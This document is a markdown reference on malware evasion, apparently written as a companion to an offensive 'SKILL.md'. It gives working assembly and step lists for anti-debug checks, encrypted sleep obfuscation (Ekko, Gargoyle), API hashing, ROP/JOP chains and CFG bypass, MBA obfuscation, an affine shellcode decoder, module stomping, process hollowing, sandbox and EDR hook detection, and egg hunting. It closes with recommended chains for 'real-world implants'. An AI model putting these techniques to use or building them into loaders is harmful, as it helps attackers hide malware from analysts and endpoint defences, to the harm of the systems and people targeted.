# Advanced Evasion Techniques

Deep-dive reference for anti-debug, sleep obfuscation evolution, API hashing,
ROP/JOP/COP chains, math obfuscation, self-modifying code, and VM detection.

---

## 1. Anti-Debug ASM Techniques

### 1.1 PEB-Based Checks

```nasm
; x64 — PEB.BeingDebugged (offset 0x02 from PEB)
mov  rax, gs:[0x60]      ; PEB*
movzx eax, byte [rax+2]  ; BeingDebugged
test eax, eax
jnz  .debugger_found

; x86 — same via FS segment
mov  eax, fs:[0x30]      ; PEB*
movzx eax, byte [eax+2]  ; BeingDebugged
test eax, eax
jnz  .debugger_found
```

### 1.2 NtGlobalFlag Check

When a process is started under a debugger, Windows sets heap-debugging flags in
`PEB.NtGlobalFlag` (offset 0x68 x86 / 0xBC x64).

```nasm
; x64
mov  rax, gs:[0x60]
mov  eax, [rax + 0xBC]   ; NtGlobalFlag
and  eax, 0x70           ; FLG_HEAP_ENABLE_TAIL_CHECK | FREE_CHECK | VALIDATE_PARAMS
jnz  .debugger_found     ; non-zero under debugger, normally 0

; x86
mov  eax, fs:[0x30]
mov  eax, [eax + 0x68]
and  eax, 0x70
jnz  .debugger_found
```

**Mitigation resistance**: Analysts can zero these fields; combine with other checks.

### 1.3 ProcessDebugPort (NtQueryInformationProcess)

```nasm
; Resolve NtQueryInformationProcess via PEB walk (hash-based)
; Class 7 = ProcessDebugPort — returns non-zero DWORD_PTR if debugging
lea  r8, [rsp+0x20]      ; ProcessInformation buffer
mov  edx, 7              ; ProcessDebugPort
mov  rcx, -1             ; GetCurrentProcess()
call [pNtQueryInformationProcess]
cmp  qword [rsp+0x20], 0
jne  .debugger_found
```

Other useful classes:
- **ProcessDebugFlags** (0x1F): returns 0 if debug object exists (inverted logic)
- **ProcessDebugObjectHandle** (0x1E): returns a valid handle if debugged

### 1.4 RDTSC Timing Checks

```nasm
; Detect slow execution (single-stepping, analysis tooling)
rdtsc
shl  rdx, 32
or   rax, rdx
mov  rbx, rax             ; save start timestamp

; ... protected code block ...

rdtsc
shl  rdx, 32
or   rax, rdx
sub  rax, rbx             ; delta = end - start
cmp  rax, THRESHOLD        ; e.g. 0x10000 (tune per-platform)
ja   .analysis_detected    ; too slow -> debugger/VM
```

**lfence variant** (serialized — more precise):
```nasm
lfence
rdtsc
lfence
; ... save, compute, compare ...
```

GuLoader-style enhanced detection:
```nasm
lfence
rdtsc
lfence
shl  edx, 20h
or   edx, eax
mov  esi, edx             ; start
pusha
mov  eax, 1
cpuid                     ; serializing — also used for hypervisor bit check
bt   ecx, 1Fh             ; bit 31 = hypervisor present
jb   .vm_detected
popa
lfence
rdtsc
lfence
shl  edx, 20h
or   edx, eax
sub  edx, esi             ; delta
cmp  edx, THRESHOLD
ja   .analysis_detected
```

### 1.5 INT 2D — Exception-Based Anti-Debug

Under a debugger: `INT 2D` is consumed as a breakpoint; no exception raised.
Without debugger: it throws `EXCEPTION_BREAKPOINT`.

```nasm
; Set up SEH/VEH before this
int  2Dh                   ; debugger swallows this
nop                        ; skip byte consumed by debugger
; if we reach here without exception -> debugger present
jmp  .debugger_found
; VEH/SEH handler -> no debugger, continue normally
```

### 1.6 CPUID Hypervisor Detection

```nasm
mov  eax, 1
cpuid
bt   ecx, 31              ; hypervisor present bit
jc   .vm_detected

; Extended: leaf 0x40000000 -> hypervisor vendor string
mov  eax, 0x40000000
cpuid
; EBX:ECX:EDX = vendor string (e.g. "VMwareVMware", "Microsoft Hv")
```

### 1.7 TLS Callback Anti-Debug

TLS callbacks execute **before** the main entry point — ideal for early anti-debug checks.
Registered via `IMAGE_TLS_DIRECTORY.AddressOfCallBacks` in the PE header.
Combine any check from §1.1–1.6 inside a TLS callback for pre-main protection.

### 1.8 NtSetInformationThread — Hide Thread from Debugger

```nasm
; ThreadHideFromDebugger = 0x11
xor  r9, r9               ; ReturnLength
xor  r8, r8               ; ThreadInformationLength
xor  edx, edx             ; ThreadInformation = NULL
mov  ecx, 0x11            ; ThreadHideFromDebugger
; ... would normally be rcx=handle, rdx=class, r8=info, r9=length
; Adjust per actual prototype; sets thread invisible to attached debugger
call [pNtSetInformationThread]
```

### 1.9 Debug Register Detection

```nasm
; GetThreadContext to check DR0-DR3 for hardware breakpoints
; If DR0-DR3 are non-zero and we didn't set them -> analyst is present
; Alternative: set up HWBP ourselves and detect if they've been modified
```

### 1.10 Heap Flags Check

```nasm
; x64: PEB->ProcessHeap at [PEB+0x30]
mov  rax, gs:[0x60]
mov  rax, [rax + 0x30]    ; ProcessHeap
mov  ecx, [rax + 0x70]    ; Flags (offset varies per OS)
cmp  ecx, 2               ; HEAP_GROWABLE (normal value)
jne  .debugger_found
mov  ecx, [rax + 0x74]    ; ForceFlags
test ecx, ecx             ; should be 0 when not debugged
jnz  .debugger_found
```

---

## 2. Sleep Obfuscation Evolution

### 2.1 Gargoyle (2016) — Timer-Based NX Sleep

Original technique: mark payload pages NX during sleep, re-arm via `SetWaitableTimer` APC.

Configuration struct holds function pointers (VirtualProtectEx, WaitForSingleObjectEx,
CreateWaitableTimer, SetWaitableTimer) + trampoline address + ROP gadget pointer.

Flow:
```
1. Copy configuration to RW memory
2. Set up APC pointing to ROP gadget -> trampoline -> VirtualProtectEx(RX)
3. VirtualProtect(payload, PAGE_READWRITE) — mark NX
4. SetWaitableTimer(interval, APC)
5. WaitForSingleObjectEx(INFINITE, alertable=TRUE)
6. Timer fires -> APC -> ROP -> VirtualProtect(RX) -> resume execution
```

### 2.2 SleepyCrypt — XOR During Sleep

Encrypts the malicious module with a single-byte XOR key during sleep.
Simple but trivially brute-forced (256 possible keys).
Improves: in-memory signature scanning fails during sleep window.
Limitation: single-byte key is weak; pattern-based detection still possible.

### 2.3 Foliage — First Encrypted ROP-Chain Sleep

First technique to combine **encryption of the running process image** with a ROP chain
for automated post-sleep re-execution. Uses APCs for the ROP chain dispatch.

### 2.4 Ekko — RSP-Based Stable ROP Chain

Uses `CreateTimerQueueTimer` firing `NtContinue` with crafted `CONTEXT` structures.
The RSP register anchors the ROP chain for stability.

```
ROP chain (6 CONTEXT structs queued via CreateTimerQueueTimer):
  1. NtContinue -> VirtualProtect(payload, PAGE_READWRITE)    // make writable
  2. NtContinue -> SystemFunction032(encrypt, &key)            // RC4/XOR encrypt payload
  3. NtContinue -> WaitForSingleObject(hEvent, sleep_ms)       // sleep
  4. NtContinue -> SystemFunction032(decrypt, &key)            // decrypt payload
  5. NtContinue -> VirtualProtect(payload, PAGE_EXECUTE_READ)  // restore RX
  6. NtContinue -> SetEvent(hEvent)                            // resume main thread
```

Key implementation details:
- `DuplicateHandle` obtains thread handle for `GetThreadContext`/`SetThreadContext`
- Each queued timer crafts a `CONTEXT` with custom RSP/RIP/RCX/RDX values
- Uses `NtContinue` as the timer callback (valid CFG target in most builds)
- `SystemFunction032` (advapi32) performs RC4 encryption — single API for encrypt/decrypt
- Thread stack is spoofed: return address overwritten to 0 during sleep, restored after wake

### 2.5 Cronos — RC4 Full-Process Encryption

Similar to Ekko but uses RC4 encryption of the entire running process image.
Flips pages RW (encrypt) -> sleep -> RW (decrypt) -> RX (execute).

### 2.6 Detection-Evasion Comparison

| Technique | Encryption | ROP chain | Timer mechanism | Year |
|---|---|---|---|---|
| Gargoyle | None (NX only) | Stack trampoline | SetWaitableTimer APC | 2016 |
| SleepyCrypt | XOR 1-byte | No | Sleep() | ~2020 |
| Foliage | Yes | APC-based | QueueUserAPC | 2022 |
| Ekko | RC4 (SystemFunction032) | NtContinue CONTEXT | CreateTimerQueueTimer | 2022 |
| Cronos | RC4 | NtContinue | CreateTimerQueueTimer | 2022 |

### 2.7 Thread Stack Spoofing During Sleep

Hook `kernel32!Sleep` or `ntdll!NtDelayExecution`:
```
1. Pre-sleep: save original return address; overwrite with 0x0
2. Call original Sleep/NtDelayExecution
3. Post-sleep: restore original return address
```
Stack walkers during sleep see null return address — no traversal beyond the hooked frame.

---

## 3. API Hashing Algorithms

### 3.1 ROR13 (Rotate Right 13)

The most common hash in shellcode (described by Skape, used in Metasploit).
Processes ASCII characters, outputs 32-bit hash. Unicode variant exists (16-bit chars).

```nasm
; x64 ROR13 hash of a null-terminated ASCII string
; Input: RSI = string pointer
; Output: EAX = hash
xor  eax, eax
.hash_loop:
    movzx edx, byte [rsi]
    test  dl, dl
    jz    .done
    ror   eax, 13            ; rotate right 13 bits
    add   eax, edx
    inc   rsi
    jmp   .hash_loop
.done:
```

**Module+Function combined hash** (Metasploit block_api):
```
module_hash = ROR13_unicode(module_name)   // e.g. "kernel32.dll" in Unicode
func_hash   = ROR13_ascii(function_name)   // e.g. "LoadLibraryA"
combined     = module_hash + func_hash
```

Common ROR13 hash values (YARA-detectable):
| Function | ROR13 hash |
|---|---|
| LoadLibraryA | 0x8E4E0EEC |
| GetProcAddress | 0xAAFC0D7C |
| VirtualAlloc | 0x54CAAF91 |
| VirtualProtect | 0x1BC64679 |
| CreateRemoteThread | 0xDD9CBD72 |

### 3.2 ROR13 Variants

| Variant | Algorithm | YARA rule |
|---|---|---|
| ror13AddHash32 | standard ROR13 + add | sc_hash_ror13AddHash32 |
| ror13AddHash32AddDll | ROR13(module) + ROR13(func) | sc_hash_ror13AddHash32AddDll |
| ror13AddHash32Sub1 | ROR13 result - 1 (evade exact match) | sc_hash_ror13AddHash32Sub1 |
| ror13AddHash32Sub20h | ROR13 with ToUpper (sub 0x20) | sc_hash_ror13AddHash32Sub20h |

### 3.3 DJB2 (Daniel J. Bernstein)

```nasm
; DJB2 hash: h = ((h << 5) + h) + c  (equivalent to h * 33 + c)
; Seed: 5381
mov  eax, 5381
.hash_loop:
    movzx edx, byte [rsi]
    test  dl, dl
    jz    .done
    shl   ecx, 5              ; ecx = h << 5
    add   ecx, eax            ; ecx = (h << 5) + h
    add   eax, edx            ; h += c
    ; Alternatively: imul eax, eax, 33 / add eax, edx
    inc   rsi
    jmp   .hash_loop
.done:
```

Compact, fast. Case-insensitive variant: `OR c, 0x20` before accumulation.
Used in ADE (RecycleGate) for Zw* function name hashing at rest.

### 3.4 CRC32 (Hardware-Accelerated)

```nasm
; Using CRC32 instruction (SSE4.2) — hardware hash
; Much harder to brute-force than ROR13
mov  eax, 0xFFFFFFFF
.hash_loop:
    movzx edx, byte [rsi]
    test  dl, dl
    jz    .done
    crc32 eax, dl             ; SSE4.2 CRC32C instruction
    inc   rsi
    jmp   .hash_loop
.done:
    not  eax                  ; finalize
```

Pros: hardware speed, low collision rate, harder to precompute.
Cons: requires SSE4.2 support (ubiquitous since ~2009).

### 3.5 FNV-1a (Fowler-Noll-Vo)

64-bit variant preferred for large export tables (fewer collisions than DJB2).

```
h = FNV_OFFSET_BASIS (0xCBF29CE484222325)
for each byte c:
    h ^= c
    h *= FNV_PRIME (0x100000001B3)
```

### 3.6 Anti-Detection for API Hashing

- **Rotate the rotation count**: use ROR-N where N varies per build (not always 13)
- **Add salt**: `hash = ROR(hash, N) + c + build_specific_salt`
- **Two-stage**: hash module name + function name separately; combine with XOR or ADD
- **Runtime hash generation**: compute expected hash values at runtime from encrypted data
  instead of embedding them as immediates (defeats YARA `uint32(offset)` rules)

---

## 4. ROP/JOP/COP Chains

### 4.1 ROP — Return-Oriented Programming

Chains of existing code snippets ("gadgets") ending in `RET` (0xC3).
Each gadget pops the next from the stack, creating a Turing-complete chain without injected code.

**Stack pivot** — redirect RSP to attacker-controlled buffer:
```nasm
; Gadget: xchg rax, rsp ; ret
; or:     pop rsp ; ret
; or:     leave ; ret  (mov rsp, rbp; pop rbp)
```

**Common ROP primitives** for DEP bypass:
```
Goal: call VirtualProtect(addr, size, PAGE_EXECUTE_READWRITE, &old)
Chain:
  pop rcx ; ret    -> rcx = shellcode_addr
  pop rdx ; ret    -> rdx = size
  pop r8  ; ret    -> r8  = 0x40 (PAGE_EXECUTE_READWRITE)
  pop r9  ; ret    -> r9  = ptr to writable DWORD
  <addr of VirtualProtect>
```

Alternative target: `VirtualAlloc` with RWX, then copy shellcode and jump.

### 4.2 JOP — Jump-Oriented Programming

Uses gadgets ending in `JMP reg` or `CALL reg` instead of `RET`.
Requires a **dispatcher gadget** that iterates through a dispatch table:

```
Dispatcher: add rax, 8 ; jmp [rax]    // advance to next gadget pointer
Dispatch table: [gadget1_addr, gadget2_addr, ...]
Each functional gadget ends with: jmp <dispatcher_reg>
```

JOP advantages:
- Bypass CET shadow stack (no `RET` mismatch)
- 16 possible ending registers (vs. 1 for ROP)
- Intermixable with ROP for larger gadget surface

JOP ROCKET tool automates JOP chain generation with:
- Dispatcher gadget search (EDX preferred — most functional gadgets)
- Setup gadget: `pop eax; pop edx; pop edi; xor edx, eax; xor edi, eax; call edx`
- Automated recipe-based chain construction

### 4.3 COP — Call-Oriented Programming

Like JOP but uses `CALL reg` gadgets exclusively.
Each gadget performs work then `CALL`s the next via a register.
Stack grows with return addresses but execution never uses them.

### 4.4 Control Flow Guard (CFG) Bypass

CFG validates indirect call targets against a bitmap of valid function entries.
Bypass strategies at ASM level:

1. **Valid-target abuse**: Call any function in the CFG bitmap (all exported functions are valid).
   Use `NtContinue`, `SetThreadContext`, `longjmp` to redirect execution post-call.

2. **Return address overwrite**: CFG only protects forward-edge (indirect calls), not
   backward-edge (return addresses). ROP chains are unaffected by CFG alone.

3. **JOP/COP**: CFG bitmap may not cover `JMP [reg]` targets (implementation-dependent).

4. **CFG bitmap manipulation**: Modify the CFG bitmap in the process's virtual memory
   to mark arbitrary addresses as valid targets.

### 4.5 CET (Control-flow Enforcement Technology) and XFG

- **CET shadow stack**: Hardware-backed return address protection. Every `CALL` pushes to
  both the regular stack and a shadow stack; `RET` compares both. Mismatch = fault.
  Impact: breaks ROP chains. JOP/COP unaffected (no `RET`).

- **CET IBT (Indirect Branch Tracking)**: Requires `ENDBR64`/`ENDBR32` as the first
  instruction at indirect branch targets. Non-ENDBR targets raise #CP.

- **XFG (eXtended Flow Guard)**: Type-based hash placed 8 bytes above dispatch call.
  Validates that the callee's type signature matches the call site's expected type.
  More granular than CFG — prevents valid-target abuse across different function prototypes.

---

## 5. Math Obfuscation & Opaque Constructs

### 5.1 Mixed Boolean Arithmetic (MBA) — Extended

Beyond `a ^ b = (a + b) - 2*(a & b)` (covered in SKILL.md §5.4):

**Linear MBA**: `Σ(aᵢ · eᵢ(x₁,...,xₜ))` where `eᵢ` are bitwise expressions, `aᵢ` are constants.
Any arithmetic operation can be rewritten as a linear MBA over boolean primitives.

Examples:
```
x + y  = (x ^ y) + 2*(x & y)
x - y  = (x ^ y) - 2*(~x & y)
x + y  = (x | y) + (x & y)
x - y  = (x & ~y) - (~x & y)
```

**Polynomial MBA**: includes multiplication of boolean terms — much harder to simplify.
```
(x ∧ y) * (x ∨ y) + (x ∧ ¬y) * (¬x ∧ y) - 41
```
Polynomial MBA resists Z3, QSynth, SSPAM, and most automated deobfuscators.

### 5.2 Opaque Predicates via MBA

Craft conditions that always evaluate to true (or false) but appear data-dependent:
```c
uint8_t k1 = 96 + 159*(y^x) + 160*y + 194*(y|x) + 96*~x;
uint8_t k2 = 193 + 64*~y + 65*(y&y) + 130*x + 129*~x;
if (k1 != k2) { /* dead code — never reached */ }
// k1 == k2 for all inputs (provable via exhaustive 8-bit check)
```

ASM application: guard real code path with opaque predicate; dead branch contains
decoy shellcode or anti-analysis traps.

### 5.3 Opaque Constants

Hide immediate values behind MBA expressions:
```
0xDEADBEEF = 3875104330*c + 2547036704*(c|c) + 4294967206*~c + ...
```
Static analyzers cannot determine the constant without evaluating with concrete inputs.
Use for: API hashes, SSN values, XOR keys, jump targets.

### 5.4 Invertible Functions for Identity Insertion

Wrap any expression `expr` in `h⁻¹(h(expr))` where h is an invertible function mod 2ⁿ:
```
h(a)   = 39*a + 23     (mod 256)
h⁻¹(a) = 151*a + 111   (mod 256)
```
Result: `expr ≡ h⁻¹(h(expr)) mod 2⁸` — adds complexity without changing semantics.

### 5.5 Affine Encoding for Shellcode Bytes

Encode each payload byte: `enc(b) = a*b + c (mod 256)` where `gcd(a, 256) = 1`.
Decode: `dec(e) = a⁻¹ * (e - c) (mod 256)`.

Valid `a` values (odd, coprime to 256): 1, 3, 5, 7, ..., 253, 255.

```nasm
; Affine decoder stub
mov  bl, A_INV          ; modular inverse of a
mov  cl, C_CONST        ; additive constant
lea  rsi, [rip + encoded_payload]
mov  ecx, PAYLOAD_LEN
.decode:
    mov  al, [rsi]
    sub  al, cl         ; (e - c)
    imul al, bl         ; a⁻¹ * (e - c) mod 256
    mov  [rsi], al
    inc  rsi
    loop .decode
```

### 5.6 Constant Blinding

Replace every immediate with a runtime computation:
```nasm
; Instead of:  mov eax, 0x40    (PAGE_EXECUTE_READWRITE)
; Use:
mov  eax, 0xDEADBEEF
xor  eax, 0xDEADBEAF         ; 0xDEADBEEF ^ 0xDEADBEAF = 0x40
; Or with rotation:
mov  eax, 0x10
shl  eax, 2                  ; 0x10 << 2 = 0x40
```

---

## 6. Self-Modifying Code & Runtime Generation

### 6.1 Classic Self-Modifying Pattern

Modify instruction operands at runtime by writing to the code's own memory:

```nasm
; Requires RWX page or VirtualProtect(RW) beforehand
; Modify the immediate in the next MOV instruction at runtime
    mov  byte [rip + .target + 1], 0x42   ; patch operand
.target:
    mov  al, 0x00                          ; <- 0x00 becomes 0x42
    ; AL now = 0x42
```

**x86 pipeline consideration**: self-modifying writes to the same cacheline as currently
executing code cause pipeline flushes and serialization. Acceptable for one-time setup;
avoid in hot loops (10-100x penalty on modern CPUs).

### 6.2 W^X Page Management

Most modern OSes enforce W^X (either writable or executable, not both).
Pattern for legitimate self-modification:

```
1. VirtualAlloc(PAGE_READWRITE)        // allocate RW
2. Write/decode shellcode into buffer
3. VirtualProtect(PAGE_EXECUTE_READ)   // flip to RX  (single transition)
4. Execute
```

Double-mapping technique (avoid VirtualProtect call):
```
1. CreateFileMapping(PAGE_EXECUTE_READWRITE, size)
2. MapViewOfFile2(FILE_MAP_WRITE)       // view1: RW
3. MapViewOfFile2(FILE_MAP_EXECUTE)     // view2: RX (same physical pages)
4. Write shellcode through view1; execute via view2
```

### 6.3 Module Stomping / DLL Hollowing

Load a legitimate DLL, then overwrite its entry point with shellcode:

```
1. LoadLibraryEx("amsi.dll", DONT_RESOLVE_DLL_REFERENCES)
2. Parse PE: DOS header -> NT headers -> AddressOfEntryPoint
3. VirtualProtect(entrypoint, shellcode_len, PAGE_READWRITE)
4. memcpy(entrypoint, shellcode, shellcode_len)
5. VirtualProtect(entrypoint, shellcode_len, PAGE_EXECUTE_READ)
6. CreateThread(entrypoint)  // thread starts at "legitimate" DLL address
```

Benefits:
- Thread start address points to a signed Microsoft DLL
- Memory region shows valid DLL backing (not unbacked RWX)
- ProcessHacker/ProcessExplorer shows clean module loading

### 6.4 Process Hollowing (RunPE)

```
1. CreateProcess("svchost.exe", CREATE_SUSPENDED)
2. NtUnmapViewOfSection(target_image_base)     // unmap original
3. VirtualAllocEx(target_image_base, size)      // allocate at same VA
4. WriteProcessMemory(PE headers + sections)    // write malicious PE
5. SetThreadContext(new entry point in RCX)     // point to malicious EP
6. ResumeThread                                 // execute malicious code
```

### 6.5 Code Caves

Find unused (zero-padded) regions in existing PE sections and inject code there.
No new memory allocation; payload appears as part of the original module.
Size limited by available padding (typically section alignment gaps — 4KB on x64).

---

## 7. VM / Sandbox Detection

### 7.1 CPUID-Based Detection

```nasm
; Standard hypervisor detection
mov  eax, 1
cpuid
bt   ecx, 31
jc   .vm_detected         ; hypervisor bit set

; Vendor string identification (leaf 0x40000000)
mov  eax, 0x40000000
cpuid
; Compare EBX:ECX:EDX against known strings:
;   "VMwareVMware"  -> VMware
;   "Microsoft Hv"  -> Hyper-V
;   "KVMKVMKVM\0\0\0" -> KVM
;   "XenVMMXenVMM"  -> Xen
;   "VBoxVBoxVBox"  -> VirtualBox
```

### 7.2 RDTSC-Based VM Detection

VMs add overhead to RDTSC — delta between two calls higher than bare metal:

```nasm
lfence
rdtsc
mov  esi, eax              ; low 32 bits of start
; ... minimal code ...
lfence
rdtsc
sub  eax, esi
cmp  eax, 500              ; bare metal typically < 100; VM > 500
ja   .vm_detected
```

### 7.3 Memory Artifact Scanning (GuLoader-Style)

```
; ZwQueryVirtualMemory to scan for VM-related strings in memory pages
; Check for: "vmware", "vbox", "qemu", "virtual", "hyperv"
; Also check for specific file paths:
;   C:\Program Files\Qemu-ga\qemu-ga.exe
;   C:\Program Files\VMware\VMware Tools\
```

### 7.4 Hook Detection

Scan ntdll function prologues for JMP (0xE9) or other hook signatures.
If hooks detected: likely analysis sandbox (EDR/AV hooks ntdll in all sandboxes).

```nasm
; Read first bytes of NtAllocateVirtualMemory
mov  rax, [pNtAllocateVirtualMemory]
cmp  byte [rax], 0x4C       ; expected: MOV R10, RCX (4C 8B D1)
jne  .hooked
cmp  byte [rax+1], 0x8B
jne  .hooked
cmp  byte [rax+2], 0xD1
jne  .hooked
; Clean — proceed with direct/indirect syscall
```

---

## 8. Advanced Shellcode Patterns

### 8.1 Egg Hunting

Search process memory for a unique marker ("egg") preceding the main payload.
Useful when injection point has limited space but full payload is elsewhere.

```nasm
; x64 egg hunter — search for 8-byte egg marker
mov  rax, 0x5079614C5079614C   ; "LPyLPy" doubled
.search:
    inc  rdi
    scasq                       ; compare [rdi] with rax
    jnz  .search
    scasq                       ; check second copy (avoid self-match)
    jnz  .search
    jmp  rdi                    ; jump to payload after egg
```

### 8.2 Staged Payload with Minimal Bootstrap

```nasm
; Stage 0: 50-byte bootstrap — resolve WSAStartup + connect + recv + jmp
; All API resolution via PEB walk + ROR13 hash
; Receives stage 1 over socket, writes to RWX buffer, jumps to it
```

### 8.3 Syscall-Only Shellcode (No API Calls)

Entire payload uses only `SYSCALL` — no loadlibrary, no getprocaddress.
Requires hardcoded or runtime-resolved SSNs.
Benefit: no IAT entries, no API call hooks, minimal artifact surface.

---

## 9. Combined Evasion Chains

Real-world implants layer multiple techniques. Recommended combinations:

### 9.1 Loader Chain Example
```
1. PEB walk (§4 SKILL.md) — resolve ntdll base, no IAT
2. FreshyCalls SSN sort (§1.3) — resolve SSNs without reading stub bytes
3. Indirect syscall (§1.2) — RIP stays in ntdll
4. Stack spoofing (§2.1) — clean call stack
5. Module stomping (§6.3 this file) — legitimate thread backing
6. Ekko sleep (§2.4 this file) — encrypted during idle
```

### 9.2 Anti-Analysis + Anti-Debug Chain
```
1. TLS callback (§1.7 this file) — pre-main anti-debug
2. RDTSC timing (§1.4) — detect single-stepping
3. CPUID + memory scan (§7) — detect VM/sandbox
4. NtSetInformationThread HideFromDebugger (§1.8)
5. INT 2D exception check (§1.5)
```

### 9.3 Shellcode Delivery Chain
```
1. Affine-encoded payload (§5.5 this file)
2. MBA opaque constants (§5.3) — hide decoder key
3. Constant blinding (§5.6) — hide VirtualProtect arguments
4. AlignRSP entry (§6.4 SKILL.md)
5. CALL-POP base address (§6.1 SKILL.md) — PIC
```
